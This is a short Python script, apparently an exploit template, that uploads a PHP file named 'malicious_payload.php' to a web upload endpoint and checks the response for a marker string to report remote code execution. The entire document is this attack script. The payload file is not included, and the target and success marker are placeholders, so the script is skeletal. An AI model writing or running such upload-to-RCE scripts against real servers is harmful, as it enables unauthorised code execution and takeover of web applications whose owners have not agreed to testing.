import requests

def exploit_rce(url, file_path):
    files = {'file': open(file_path, 'rb')}
    response = requests.post(url, files=files)
    
    if "malicious_code_executed" in response.text:  # Check for RCE success indicator
        print(f"RCE successful with file: {file_path}")
    else:
        print("RCE attempt failed.")

if __name__ == "__main__":
    target_url = "http://example.com/upload"
    payload_file = "malicious_payload.php"  # PHP file with payload
    exploit_rce(target_url, payload_file)
